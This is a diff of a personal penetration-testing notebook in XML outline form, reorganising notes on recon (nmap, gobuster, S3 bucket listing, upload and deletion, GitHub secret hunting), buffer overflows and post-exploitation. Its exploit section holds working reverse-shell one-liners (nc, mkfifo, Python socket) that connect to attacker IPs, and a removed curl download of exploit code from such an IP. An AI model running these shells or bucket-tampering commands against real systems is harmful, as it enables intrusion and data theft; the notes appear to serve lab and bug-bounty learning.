@@ -770,181 +770,12 @@ npm i &lt;package_name&gt;</rich_text>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="docker" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1658114839.01" ts_lastsave="1658117659.73" unique_id="77">
 		<rich_text>sudo docker create --gpus all -p 8008:6006 -p 7777:8888 --mount type=bind,source=/home/marco/DISK/large/CELL,target=/workspace/ --name cell-2021 -it f0b0261fec71</rich_text>
 	</node>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="recon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394208.07" ts_lastsave="1655797967.12" unique_id="18">
+	<node custom_icon_id="0" foreground="" is_bold="False" name="BBH_WEB_MOBILE_APPLEVEL" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1659590868.54" ts_lastsave="1659590908.71" unique_id="80">
 		<rich_text></rich_text>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="S3_testing" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655797334.56" ts_lastsave="1655814645.25" unique_id="48">
-			<rich_text>Once you’ve found a couple of buckets that belong to the target organization, use the AWS command line tool to see if you can access one. Install the tool by using the following command:
-pip install awscli
-
-Then configure it to work with AWS by following Amazon’s documentation at </rich_text>
-			<rich_text link="webs https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html.">https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html.</rich_text>
-			<rich_text> Now you should be able to access buckets directly from your terminal via the aws s3 command. Try listing the contents of the bucket you found:
-
-aws s3 ls s3://BUCKET_NAME/
-
-If this works, see if you can read the contents of any interesting files by copying files to your local machine:
-aws s3 cp s3://BUCKET_NAME/FILE_NAME/path/to/local/directory
-
-Gather any useful information leaked via the bucket and use it for future exploitation! If the organization reveals information such as active API keys or personal information, you should report this right away. Exposed S3 buckets alone are often considered a vulnerability. You can also try to upload new files to the bucket or delete files from it. If you can mess with its contents, you might be able to tamper with the web application’s operations or corrupt company data. For example, this command will copy your local file named TEST_FILE into the target’s S3 bucket:
-
-aws s3 cp TEST_FILE s3://BUCKET_NAME/
-
-And this command will remove the TEST_FILE that you just uploaded:
-
-aws s3 rm s3://BUCKET_NAME/TEST_FILE
-</rich_text>
-		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="enum4linux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394769.66" ts_lastsave="1655394791.58" unique_id="28">
-			<rich_text>SMBShare enumeration
-enum4linux -a &lt;ip&gt;</rich_text>
-		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="general_network_recon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394791.58" ts_lastsave="1655394811.27" unique_id="29">
-			<rich_text>ping
-ping &lt;ip/domain_target&gt;
-
-traceroute
-tracert &lt;ip/domain_target&gt;
-
-dig
-dig &lt;ip/domain_target&gt;
-
-whois
-whois &lt;ip/domain_target&gt;</rich_text>
-		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="gobuster" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394811.27" ts_lastsave="1655794881.49" unique_id="30">
-			<rich_text>gobuster dir -u </rich_text>
-			<rich_text link="webs http://&lt;url&gt;">http://&lt;url&gt;</rich_text>
-			<rich_text> -w &lt;path_to_wordlist&gt;
-
-gobuster dns -d target_domain -w wordlist
-</rich_text>
-		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="nmap" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394814.09" ts_lastsave="1655394981.76" unique_id="31">
-			<rich_text foreground="#569cd6">default</rich_text>
-			<rich_text foreground="#d4d4d4">:</rich_text>
-			<rich_text>
-</rich_text>
-			<rich_text foreground="#ce9178">nmap &lt;host&gt;</rich_text>
-			<rich_text>
-
-</rich_text>
-			<rich_text foreground="#569cd6">favorite</rich_text>
-			<rich_text foreground="#d4d4d4">:</rich_text>
-			<rich_text>
-</rich_text>
-			<rich_text foreground="#ce9178">nmap -sC -sV -v &lt;host&gt;</rich_text>
-			<rich_text>
-
-</rich_text>
-			<rich_text foreground="#569cd6">favorite BBH</rich_text>
-			<rich_text foreground="#d4d4d4">:</rich_text>
-			<rich_text>
-</rich_text>
-			<rich_text foreground="#ce9178">nmap -sC -sV -p- -v &lt;host&gt; -oG &lt;output_file&gt;</rich_text>
-			<rich_text>
-
-</rich_text>
-			<rich_text foreground="#569cd6">vuln script</rich_text>
-			<rich_text foreground="#d4d4d4">:</rich_text>
-			<rich_text>
-</rich_text>
-			<rich_text foreground="#ce9178">nmap --script vuln &lt;host&gt;</rich_text>
-			<rich_text>
-
-</rich_text>
-			<rich_text foreground="#ce9178">full tcp scan
--sT</rich_text>
-			<rich_text>
-
-</rich_text>
-			<rich_text foreground="#ce9178">half scan (syn scan, stealth scan)
--sS</rich_text>
-			<rich_text>
-
-</rich_text>
-			<rich_text foreground="#ce9178">UDP scan
--sU</rich_text>
-			<rich_text>
-
-</rich_text>
-			<rich_text foreground="#ce9178">ping sweep
-nmap -sn i&lt;ip_range i.e 127.0.0.1-255 or CIDR&lt;xxx.xxx.xxx.xxx/yy&gt;</rich_text>
-			<rich_text>
-
-</rich_text>
-			<rich_text foreground="#ce9178">scripts
-safe:- Won't affect the target</rich_text>
-			<rich_text>
-</rich_text>
-			<rich_text foreground="#569cd6">intrusive:- Not safe</rich_text>
-			<rich_text foreground="#d4d4d4">: </rich_text>
-			<rich_text foreground="#ce9178">likely to affect the target
-vuln:- Scan for vulnerabilities
-exploit:- Attempt to exploit a vulnerability
-auth:- Attempt to bypass authentication for running services (e.g. Log into an FTP server anonymously)
-brute:- Attempt to bruteforce credentials for running services
-discovery:- Attempt to query running services for further information about the network (e.g. query an SNMP server).</rich_text>
-			<rich_text>
-
-</rich_text>
-			<rich_text foreground="#569cd6">exhaustive list</rich_text>
-			<rich_text foreground="#d4d4d4"> : </rich_text>
-			<rich_text foreground="#ce9178">https://nmap.org/book/nse-usage.html</rich_text>
-			<rich_text>
-
-</rich_text>
-			<rich_text foreground="#ce9178">search for script
-grep &quot;ftp&quot; /usr/share/nmap/scripts/script.db</rich_text>
-			<rich_text>
-
-</rich_text>
-			<rich_text foreground="#ce9178">download new script
-sudo wget -O /usr/share/nmap/scripts/&lt;script-name&gt;.nse </rich_text>
-			<rich_text foreground="#ce9178" link="webs https://svn.nmap.org/nmap/scripts/&lt;script-name&gt;.nse">https://svn.nmap.org/nmap/scripts/&lt;script-name&gt;.nse</rich_text>
-			<rich_text foreground="#ce9178">
-nmap --script-updatedb</rich_text>
-		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="nslookup" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394818.51" ts_lastsave="1655394997.63" unique_id="32">
-			<rich_text>using nslookup to get more info on a website
-
-nslookup --type=A website.thm
-nslookup --type=CNAME website.thm
-nslookup --type=MX website.thm
-nslookup --type=TXT website.thm</rich_text>
-		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="google_dork" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655797145.35" ts_lastsave="1655797270.0" unique_id="46">
-			<rich_text>third party
-
-site:s3.amazonaws.com COMPANY_NAME
-site:amazonaws.com COMPANY_NAME
-
-amazonaws s3 COMPANY_NAME
-amazonaws bucket COMPANY_NAME
-amazonaws COMPANY_NAME
-s3 COMPANY_NAME
-</rich_text>
-		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="crt.sh" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655797274.1" ts_lastsave="1655797274.62" unique_id="47">
-			<rich_text link="webs https://crt.sh/">https://crt.sh/</rich_text>
-			<rich_text>?q=facebook.com&amp;output=json.
-</rich_text>
-		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="github_recon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655797967.12" ts_lastsave="1655798008.49" unique_id="49">
-			<rich_text>Tools like Gitrob and TruffleHog can automate the GitHub recon process. Gitrob (</rich_text>
-			<rich_text link="webs https://github.com/michenriksen/gitrob/)">https://github.com/michenriksen/gitrob/)</rich_text>
-			<rich_text> locates potentially sensitive files pushed to public repositories on GitHub. TruffleHog (</rich_text>
-			<rich_text link="webs https://github.com/">https://github.com/</rich_text>
-			<rich_text>trufflesecurity/truffleHog/) specializes in finding secrets in repositories by conducting regex searches and scanning for high-entropy strings.
-
-After you’ve found leaked credentials, you can use KeyHacks (</rich_text>
-			<rich_text link="webs https://github.com/streaak/keyhacks/)">https://github.com/streaak/keyhacks/)</rich_text>
-			<rich_text> to check if the credentials are valid and learn how to use them to access the target’s services</rich_text>
-		</node>
-	</node>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="exploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655471333.24" ts_lastsave="1658553478.02" unique_id="36">
-		<rich_text></rich_text>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="command_injection_or_shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655471362.28" ts_lastsave="1655965678.03" unique_id="37">
-			<rich_text>Reverse
+		<node custom_icon_id="0" foreground="" is_bold="False" name="exploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655471333.24" ts_lastsave="1659590885.51" unique_id="36">
+			<rich_text></rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="command_injection_or_shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655471362.28" ts_lastsave="1659590868.54" unique_id="37">
+				<rich_text>Reverse
 
 nc 172.16.1.100 1234 -e /bin/sh
 
@@ -960,9 +791,9 @@ mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.18.200.169&quot;,1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)'
 
 </rich_text>
-		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="unique_javascript_behaviour" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1657475731.84" ts_lastsave="1657483489.2" unique_id="76">
-			<rich_text>I just started working on portswigger's web cache poisoning, there is an XSS in which we inject a javascript object where the result of the injection looks like this:
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="unique_javascript_behaviour" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1657475731.84" ts_lastsave="1657483489.2" unique_id="76">
+				<rich_text>I just started working on portswigger's web cache poisoning, there is an XSS in which we inject a javascript object where the result of the injection looks like this:
 
 ```data = { &quot;a&quot; : &quot;b&quot;, &quot;c&quot; : &quot;c&quot;-alert(0)-&quot;c&quot;}```
 
@@ -971,13 +802,86 @@ my question is, why is this alert got triggered? also this triggers on the follo
 anybody can help?
 
 </rich_text>
-			<rich_text foreground="#e7e9ea">JavaScript will allow you to use any object with a mathematical operator. In this case both strings will be used with the - operator and alert will be called and the result of calling alert will be undefined and that will also be used as part of the expression.</rich_text>
-			<rich_text>
+				<rich_text foreground="#e7e9ea">JavaScript will allow you to use any object with a mathematical operator. In this case both strings will be used with the - operator and alert will be called and the result of calling alert will be undefined and that will also be used as part of the expression.</rich_text>
+				<rich_text>
 
 </rich_text>
-			<rich_text link="webs https://twitter.com/garethheyes/status/1546212977917018114">https://twitter.com/garethheyes/status/1546212977917018114</rich_text>
+				<rich_text link="webs https://twitter.com/garethheyes/status/1546212977917018114">https://twitter.com/garethheyes/status/1546212977917018114</rich_text>
+			</node>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="Buffer_Overflow" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1658553478.02" ts_lastsave="1658565551.96" unique_id="79">
+		<node custom_icon_id="0" foreground="" is_bold="False" name="recon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394208.07" ts_lastsave="1659590887.19" unique_id="18">
+			<rich_text></rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="S3_testing" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655797334.56" ts_lastsave="1659590937.7" unique_id="48">
+				<rich_text>Once you’ve found a couple of buckets that belong to the target organization, use the AWS command line tool to see if you can access one. Install the tool by using the following command:
+pip install awscli
+
+Then configure it to work with AWS by following Amazon’s documentation at </rich_text>
+				<rich_text link="webs https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html.">https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html.</rich_text>
+				<rich_text> Now you should be able to access buckets directly from your terminal via the aws s3 command. Try listing the contents of the bucket you found:
+
+aws s3 ls s3://BUCKET_NAME/
+
+If this works, see if you can read the contents of any interesting files by copying files to your local machine:
+aws s3 cp s3://BUCKET_NAME/FILE_NAME/path/to/local/directory
+
+Gather any useful information leaked via the bucket and use it for future exploitation! If the organization reveals information such as active API keys or personal information, you should report this right away. Exposed S3 buckets alone are often considered a vulnerability. You can also try to upload new files to the bucket or delete files from it. If you can mess with its contents, you might be able to tamper with the web application’s operations or corrupt company data. For example, this command will copy your local file named TEST_FILE into the target’s S3 bucket:
+
+aws s3 cp TEST_FILE s3://BUCKET_NAME/
+
+And this command will remove the TEST_FILE that you just uploaded:
+
+aws s3 rm s3://BUCKET_NAME/TEST_FILE
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="gobuster" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394811.27" ts_lastsave="1655794881.49" unique_id="30">
+				<rich_text>gobuster dir -u </rich_text>
+				<rich_text link="webs http://&lt;url&gt;">http://&lt;url&gt;</rich_text>
+				<rich_text> -w &lt;path_to_wordlist&gt;
+
+gobuster dns -d target_domain -w wordlist
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="nslookup" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394818.51" ts_lastsave="1655394997.63" unique_id="32">
+				<rich_text>using nslookup to get more info on a website
+
+nslookup --type=A website.thm
+nslookup --type=CNAME website.thm
+nslookup --type=MX website.thm
+nslookup --type=TXT website.thm</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="google_dork" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655797145.35" ts_lastsave="1655797270.0" unique_id="46">
+				<rich_text>third party
+
+site:s3.amazonaws.com COMPANY_NAME
+site:amazonaws.com COMPANY_NAME
+
+amazonaws s3 COMPANY_NAME
+amazonaws bucket COMPANY_NAME
+amazonaws COMPANY_NAME
+s3 COMPANY_NAME
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="crt.sh" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655797274.1" ts_lastsave="1655797274.62" unique_id="47">
+				<rich_text link="webs https://crt.sh/">https://crt.sh/</rich_text>
+				<rich_text>?q=facebook.com&amp;output=json.
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="github_recon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655797967.12" ts_lastsave="1655798008.49" unique_id="49">
+				<rich_text>Tools like Gitrob and TruffleHog can automate the GitHub recon process. Gitrob (</rich_text>
+				<rich_text link="webs https://github.com/michenriksen/gitrob/)">https://github.com/michenriksen/gitrob/)</rich_text>
+				<rich_text> locates potentially sensitive files pushed to public repositories on GitHub. TruffleHog (</rich_text>
+				<rich_text link="webs https://github.com/">https://github.com/</rich_text>
+				<rich_text>trufflesecurity/truffleHog/) specializes in finding secrets in repositories by conducting regex searches and scanning for high-entropy strings.
+
+After you’ve found leaked credentials, you can use KeyHacks (</rich_text>
+				<rich_text link="webs https://github.com/streaak/keyhacks/)">https://github.com/streaak/keyhacks/)</rich_text>
+				<rich_text> to check if the credentials are valid and learn how to use them to access the target’s services</rich_text>
+			</node>
+		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Pentest" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1659590908.71" ts_lastsave="1659590911.44" unique_id="81">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Buffer_Overflow" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1658553478.02" ts_lastsave="1659590921.06" unique_id="79">
 			<rich_text>Spiking using:
 generic_send_tcp &lt;host&gt; &lt;port&gt; &lt;something.spk&gt; 0 0
 
@@ -997,6 +901,111 @@ immunity debugger
 Ctrl+G to look for specific address assemblly command
 F2 to make break point</rich_text>
 		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="recon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1659590921.06" ts_lastsave="1659590921.06" unique_id="82">
+			<rich_text></rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="general_network_recon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394791.58" ts_lastsave="1659590933.17" unique_id="29">
+				<rich_text>ping
+ping &lt;ip/domain_target&gt;
+
+traceroute
+tracert &lt;ip/domain_target&gt;
+
+dig
+dig &lt;ip/domain_target&gt;
+
+whois
+whois &lt;ip/domain_target&gt;</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="enum4linux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394769.66" ts_lastsave="1659590934.97" unique_id="28">
+				<rich_text>SMBShare enumeration
+enum4linux -a &lt;ip&gt;</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="nmap" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394814.09" ts_lastsave="1659590927.32" unique_id="31">
+				<rich_text foreground="#569cd6">default</rich_text>
+				<rich_text foreground="#d4d4d4">:</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text foreground="#ce9178">nmap &lt;host&gt;</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text foreground="#569cd6">favorite</rich_text>
+				<rich_text foreground="#d4d4d4">:</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text foreground="#ce9178">nmap -sC -sV -v &lt;host&gt;</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text foreground="#569cd6">favorite BBH</rich_text>
+				<rich_text foreground="#d4d4d4">:</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text foreground="#ce9178">nmap -sC -sV -p- -v &lt;host&gt; -oG &lt;output_file&gt;</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text foreground="#569cd6">vuln script</rich_text>
+				<rich_text foreground="#d4d4d4">:</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text foreground="#ce9178">nmap --script vuln &lt;host&gt;</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text foreground="#ce9178">full tcp scan
+-sT</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text foreground="#ce9178">half scan (syn scan, stealth scan)
+-sS</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text foreground="#ce9178">UDP scan
+-sU</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text foreground="#ce9178">ping sweep
+nmap -sn i&lt;ip_range i.e 127.0.0.1-255 or CIDR&lt;xxx.xxx.xxx.xxx/yy&gt;</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text foreground="#ce9178">scripts
+safe:- Won't affect the target</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text foreground="#569cd6">intrusive:- Not safe</rich_text>
+				<rich_text foreground="#d4d4d4">: </rich_text>
+				<rich_text foreground="#ce9178">likely to affect the target
+vuln:- Scan for vulnerabilities
+exploit:- Attempt to exploit a vulnerability
+auth:- Attempt to bypass authentication for running services (e.g. Log into an FTP server anonymously)
+brute:- Attempt to bruteforce credentials for running services
+discovery:- Attempt to query running services for further information about the network (e.g. query an SNMP server).</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text foreground="#569cd6">exhaustive list</rich_text>
+				<rich_text foreground="#d4d4d4"> : </rich_text>
+				<rich_text foreground="#ce9178">https://nmap.org/book/nse-usage.html</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text foreground="#ce9178">search for script
+grep &quot;ftp&quot; /usr/share/nmap/scripts/script.db</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text foreground="#ce9178">download new script
+sudo wget -O /usr/share/nmap/scripts/&lt;script-name&gt;.nse </rich_text>
+				<rich_text foreground="#ce9178" link="webs https://svn.nmap.org/nmap/scripts/&lt;script-name&gt;.nse">https://svn.nmap.org/nmap/scripts/&lt;script-name&gt;.nse</rich_text>
+				<rich_text foreground="#ce9178">
+nmap --script-updatedb</rich_text>
+			</node>
+		</node>
 	</node>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="post_exploit_shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655814635.88" ts_lastsave="1656818398.09" unique_id="51">
 		<rich_text link="webs https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</rich_text>
@@ -1005,7 +1014,7 @@ F2 to make break point</rich_text>
 		<rich_text link="webs https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh">https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh</rich_text>
 		<rich_text>
 </rich_text>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="shell_stabilizer" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655791685.61" ts_lastsave="1659188356.39" unique_id="45">
+		<node custom_icon_id="0" foreground="" is_bold="False" name="shell_stabilizer" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655791685.61" ts_lastsave="1659188943.28" unique_id="45">
 			<rich_text>stable shell
 technique 1:
 
@@ -1068,18 +1077,6 @@ Next, in your reverse/bind shell, type in:
 and
 </rich_text>
 			<rich_text family="monospace">stty cols &lt;number&gt;</rich_text>
-			<rich_text>
-
-</rich_text>
-			<rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</rich_text>
-			<rich_text>
-
-curl </rich_text>
-			<rich_text link="webs http:///test.c">http://10.18.200.169:8888/test.c</rich_text>
-			<rich_text> -o test.c
-gcc -z execstack test.c -o test
-
-minerva  | 0493a385607d679ae21364e3d2a45ef6</rich_text>
 		</node>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="privesc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655817747.98" ts_lastsave="1655990861.12" unique_id="52">
 			<rich_text>find SUID
